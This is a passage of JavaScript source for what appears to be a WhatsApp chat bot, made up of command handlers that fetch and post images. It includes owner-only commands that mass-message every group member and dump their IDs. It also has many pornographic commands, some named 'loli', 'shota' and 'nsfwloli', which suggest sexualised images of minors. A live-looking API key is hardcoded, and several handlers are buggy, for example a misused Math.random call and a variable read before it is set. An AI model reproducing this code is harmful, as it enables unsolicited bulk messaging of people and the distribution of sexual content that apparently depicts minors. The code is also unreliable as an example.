if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
Lucy.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case '>':
case '=>':
if (!GhostTheCreator) return GhostStickOwner()
var err = new TypeError
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return replygcGhost(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replygcGhost(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replygcGhost(util.format(_syntax + _err))
}
break
case 'pushcontact': {
    if (!GhostTheCreator) return GhostStickOwner()
      if (!m.isGroup) return replygcGhost(`The feature works only in grup`)
    if (!text) return replygcGhost(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcGhost(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    Lucy.sendMessage(pler, { text: q})
     }  
     replygcGhost(`Done`)
      }
      break
case "pushcontactv2":{
if (!GhostTheCreator) return GhostStickOwner()
if (!q) return replygcGhost(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
GhostStickWait()
const metadata2 = await Lucy.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
Lucy.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replygcGhost(`Success`)
}
break

            case 'id':{
            replygcGhost(from)
           }
          break
          case 'userjid':{
          	if(!GhostTheCreator) return GhostStickOwner()
        const groupMetadata = m.isGroup ? await Lucy.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replygcGhost(textt)
    }
    break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replygcGhost(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return replygcGhost(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await Lucy.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break
	case 'hentaivid2': {
if (!m.isGroup) return GhostStickGroup()

if (!AntiNsfw) return replygGhost(mess.nsfw)
GhostStickWait()
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
Lucy.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return GhostStickGroup()
if (!AntiNsfw) return replygcGhost(mess.nsfw)
                GhostStickWait()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                Lucy.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return GhostStickGroup()
if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return GhostStickGroup()
if (!AntiNsfw) return replygcGhost(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return GhostStickGroup()
if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!m.isGroup) return GhostStickGroup()
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break 
case 'animespank':
if (!m.isGroup) return GhostStickGroup()
if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await Lucy.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ahegao':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'ass':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'blowjob':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'cum':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'ero':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'femdom':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'foot':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'glasses':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'hentai':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'jahy':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'manga':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'masturbation':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'panties':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'tentacles':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'thighs':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thighs.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return GhostStickGroup()
	if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
var Ghostyresult = pickRandom(ahegaonsfw)
Lucy.sendMessage(m.chat, { caption: mess.success, image: { url: Ghostyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return GhostStickGroup()
if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await Lucy.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return GhostStickGroup()
if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
var Ghostyresultx = pickRandom(ahegaonsfw)
    await Lucy.sendMessage(m.chat,{video:Ghostyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return GhostStickGroup()
if (!AntiNsfw) return replygcGhost(mess.nsfw)
GhostStickWait()
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGGhost/GhostMedia/master/foot.json')
Lucy.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'animeawoo':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animemegumin':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeshinobu':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehandhold':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehighfive':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecringe':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animedance':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehappy':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeglomp':{
GhostStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await Lucy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmug':{
GhostStickWait()
